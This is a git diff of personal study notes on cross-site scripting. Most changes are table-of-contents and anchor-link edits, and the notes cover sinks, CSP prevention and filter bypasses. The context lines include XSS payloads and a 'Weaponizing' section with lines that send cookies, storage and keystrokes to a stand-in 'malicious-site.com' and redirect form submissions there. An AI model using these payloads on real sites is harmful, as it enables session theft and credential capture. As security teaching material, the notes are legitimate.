@@ -87,41 +87,37 @@ R<h1>This is NOT a PDF!</h1> <img src=x onerror=alert(document.cookie)>
 		6. Server-Side Validation
 		7. Output Encoding
 
-## Table of Contents
-
 <!-- TOC -->
 
-- [Cross Site ScriptingXSS](#cross-site-scriptingxss)
-	- [Todo](#todo)
-	- [Need to research](#need-to-research)
-	- [Table of Contents](#table-of-contents)
-	- [URL parameter XSS](#url-parameter-xss)
-	- [Common payloads](#common-payloads)
-	- [Different types of Sinks - Where user input is used](#different-types-of-sinks---where-user-input-is-used)
-		- [Inside html elements](#inside-html-elements)
-		- [Inside html attributes](#inside-html-attributes)
-			- [Uniform Resource IdentifierURIs](#uniform-resource-identifieruris)
-		- [Inside JavascriptClient side javascript inject](#inside-javascriptclient-side-javascript-inject)
-		- [Inside CSS](#inside-css)
-		- [Inside JSON](#inside-json)
-	- [Easy ways to prevent XSS](#easy-ways-to-prevent-xss)
-		- [Content Security Policies CSPs](#content-security-policies-csps)
-			- [Directive Names](#directive-names)
-			- [Directive Sources](#directive-sources)
-			- [Implementing CSPs in Express](#implementing-csps-in-express)
-	- [Bypassing common XSS filters](#bypassing-common-xss-filters)
-	- [Weaponizing XSS payloads](#weaponizing-xss-payloads)
-		- [Stealing information](#stealing-information)
-			- [Key logger](#key-logger)
-		- [What information to steal](#what-information-to-steal)
-		- [Manipulating actions](#manipulating-actions)
-	- [HTML encodingsearch and replace vs HTML sanitizationAllowing some elements](#html-encodingsearch-and-replace-vs-html-sanitizationallowing-some-elements)
-	- [File upload vulnerabilities](#file-upload-vulnerabilities)
-	- [Reference table](#reference-table)
+- [Todo](#todo)
+- [Need to research](#need-to-research)
+- [URL parameter XSS](#url-parameter-xss)
+- [Common payloads](#common-payloads)
+- [Different types of Sinks - Where user input is used](#different-types-of-sinks---where-user-input-is-used)
+	- [Inside html elements](#inside-html-elements)
+	- [Inside html attributes](#inside-html-attributes)
+		- [Uniform Resource IdentifierURIs](#uniform-resource-identifieruris)
+	- [Inside JavascriptClient side javascript inject](#inside-javascriptclient-side-javascript-inject)
+	- [Inside CSS](#inside-css)
+	- [Inside JSON](#inside-json)
+- [Easy ways to prevent XSS](#easy-ways-to-prevent-xss)
+	- [Content Security Policies CSPs](#content-security-policies-csps)
+		- [Directive Names](#directive-names)
+		- [Directive Sources](#directive-sources)
+		- [Implementing CSPs in Express](#implementing-csps-in-express)
+- [Bypassing common XSS filters](#bypassing-common-xss-filters)
+- [Weaponizing XSS payloads](#weaponizing-xss-payloads)
+	- [Stealing information](#stealing-information)
+		- [Key logger](#key-logger)
+	- [What information to steal](#what-information-to-steal)
+	- [Manipulating actions](#manipulating-actions)
+- [HTML encodingsearch and replace vs HTML sanitizationAllowing some elements](#html-encodingsearch-and-replace-vs-html-sanitizationallowing-some-elements)
+- [File upload vulnerabilities](#file-upload-vulnerabilities)
+- [Reference table](#reference-table)
 
 <!-- /TOC -->
 
-## [URL parameter XSS](#table-of-contents)
+## [URL parameter XSS](#cross-site-scriptingxss)
 - The URL parameter has to be used somewhere within the DOM.
 	- This may not visually show up, but they may still be used. Ex: Hidden inputs
 
@@ -135,7 +131,7 @@ Possible html output
 - Forms often use URL parameters to pass information
 - Fragment identifiers(`#`s in the URL) can be used by the client to change the DOM.
 
-## [Common payloads](#table-of-contents)
+## [Common payloads](#cross-site-scriptingxss)
 - `<script>print()</script>`
 - `<img src onerror=print()>`
 - `<a href="javascript:print()">`
@@ -151,9 +147,9 @@ Common payload content
 - `console.log()`
 - You can use ``` print`` ``` instead of `print()`
 
-## [Different types of Sinks - Where user input is used](#table-of-contents)
+## [Different types of Sinks - Where user input is used](#cross-site-scriptingxss)
 
-### [Inside html elements](#table-of-contents)
+### [Inside html elements](#cross-site-scriptingxss)
 - Ex: `<p>userInput</p>`
 
 In order to perform an attack on this sink you can:
@@ -164,7 +160,7 @@ In order to prevent this any `<`s should be filtered out
 - Ex: `userInput = userInput.replaceAll("<", "&lt;")`
 - This works because no html entity can start or end without a `<`
 
-### [Inside html attributes](#table-of-contents)
+### [Inside html attributes](#cross-site-scriptingxss)
 - Ex: `<a src="userInput">Link</a>`
 - Ex 2: `<input value="userInput">`
 
@@ -207,7 +203,7 @@ if (isSafeUrl(userInputUrl)) {
 }
 ```
 
-#### [Uniform Resource Identifier(URIs)](#table-of-contents)
+#### [Uniform Resource Identifier(URIs)](#cross-site-scriptingxss)
 - URIs are often used for attributes which can access the internet
 	- `src`, `href`, `action`, `data`, `formaction`, `poster`, `manifest`, `ping`, `cite`, `usemap`
 - URIs can also be used for many event based attributes
@@ -247,7 +243,7 @@ In order to prevent URI attacks there should be a whitelist of acceptable URIs a
 
 `<a src="?javascript:print()">Link</a>` does not work
 
-### [Inside Javascript(Client side javascript inject)](#table-of-contents)
+### [Inside Javascript(Client side javascript inject)](#cross-site-scriptingxss)
 - Ex:
 
 Javascript evaluates functions that are inside other function and there is no limit to the amount of arguments.
@@ -281,15 +277,15 @@ const param2 = params.get('param2')
 		- This doesn't work if the element is a script?
 
 
-### [Inside CSS](#table-of-contents)
+### [Inside CSS](#cross-site-scriptingxss)
 	- Not very common
 
-### [Inside JSON](#table-of-contents)
+### [Inside JSON](#cross-site-scriptingxss)
 	- Have to escape the "s
 	- Inject another key and value
 	- Can you also execute javascript of html?
 
-## [Easy ways to prevent XSS](#table-of-contents)
+## [Easy ways to prevent XSS](#cross-site-scriptingxss)
 - Pass information through the body instead of through URL parameters
 - Be very cautious when using react's `dangerouslySetInnerHTML`
 - Follow the common prevention techniques for the different sinks
@@ -297,7 +293,7 @@ const param2 = params.get('param2')
 - Use whitelists and/or blacklists for allowable data
 - Use Content Security Policy
 
-### [Content Security Policies (CSPs)](#table-of-contents)
+### [Content Security Policies (CSPs)](#cross-site-scriptingxss)
 - Content Security Policy allows the browser/client to whitelist what sources are allowed to be used for scripts, styles, images, and other elements.
 	- They are used to help mitigate XSS attacks
 - CSPs are set by the server through a header called `Content-Security-Policy:` or `Content-Security-Policy-Report-Only:`
@@ -311,7 +307,7 @@ Content-Security-Policy: script-src 'self' https://www.example.com; report-uri '
                         [                                      Value                                    ]
 ```
 
-#### [Directive Names](#table-of-contents)
+#### [Directive Names](#cross-site-scriptingxss)
 - The names of the directives specifies the element or attribute which is being whitelisted.
 
 Resources/Fetch directives
@@ -375,7 +371,7 @@ Other Directives
 	- frame-src
 - report-uri
 
-#### [Directive Sources](#table-of-contents)
+#### [Directive Sources](#cross-site-scriptingxss)
 - The source of the directives specifies the whitelist for the element or attribute.
 
 | Source | Description |
@@ -427,11 +423,11 @@ let jsCode = `
 ></script>
 ```
 
-#### [Implementing CSPs in Express](#table-of-contents)
+#### [Implementing CSPs in Express](#cross-site-scriptingxss)
 
 - Set default-src to 'none' first
 
-## [Bypassing common XSS filters](#table-of-contents)
+## [Bypassing common XSS filters](#cross-site-scriptingxss)
 - Trying the same character multiple times(replace vs replaceAll)
 - Avoiding commonly used XSS attacks
 	- Try something other than
@@ -459,15 +455,15 @@ See [XXS Tests](./xss_tests.md)
 - Try to avoid attack vectors where everyone will try XSS
 	- The 1st search box on the home page
 
-## [Weaponizing XSS payloads](#table-of-contents)
+## [Weaponizing XSS payloads](#cross-site-scriptingxss)
 
-### [Stealing information](#table-of-contents)
+### [Stealing information](#cross-site-scriptingxss)
 - Redirect site to malicious site: `window.location='https://malicious-site.com?info=' + info`
 - Send data to malicious site without redirect: `
 - Mouse hover over element: `<a href="https://www.youtube.com/" onmouseover="window.location='https://malicious-site.com?info=' + info">Youtube</a>`
 	- This could be blocked by Content Security Policy
 
-#### [Key logger](#table-of-contents)
+#### [Key logger](#cross-site-scriptingxss)
 - Can't use `fetch` because it's blocked by CORS
 
 ```javascript
@@ -478,29 +474,29 @@ document.addEventListener('keydown', (event) => {
 });
 ```
 
-### [What information to steal](#table-of-contents)
+### [What information to steal](#cross-site-scriptingxss)
 - Cookies: `escape(document.cookie)`
 	- `escape` URL encodes the cookie so it can be sent through the URL
 - Storage: `escape(JSON.stringify(localStorage))` or `escape(JSON.stringify(sessionStorage))`
 
-### [Manipulating actions](#table-of-contents)
+### [Manipulating actions](#cross-site-scriptingxss)
 - Wait for elements to load: `<script>window.onload=function(){`
 	- Making a comment: `document.getElementByName('comment')[0].innerHTML='Comment';document.getElementById('theform').submit();`
 	- Changing action(where info is sent) of a form: `document.getElementById('theform').action='https://malicious-site.com'`
 - `}</script>`
 
 
-## [HTML encoding(search and replace) vs HTML sanitization(Allowing some elements)](#table-of-contents)
+## [HTML encoding(search and replace) vs HTML sanitization(Allowing some elements)](#cross-site-scriptingxss)
 - **HTML encoding** - Search and replace key characters to prevent XSS
 - **HTML Sanitization** - Some user input need to allow certain HTML elements.
 	- It can be very difficult to prevent XSS attacks. Often whitelists are used to prevent malicious HTML elements, but this may not be set up correctly.
 	- Ex: Stylized emails with HTML and CSS
 
-## [File upload vulnerabilities](#table-of-contents)
+## [File upload vulnerabilities](#cross-site-scriptingxss)
 - SVGs
 - PDFs
 
-## [Reference table](#table-of-contents)
+## [Reference table](#cross-site-scriptingxss)
 
 - Same number as URL(Hex)
 	- HTML hex
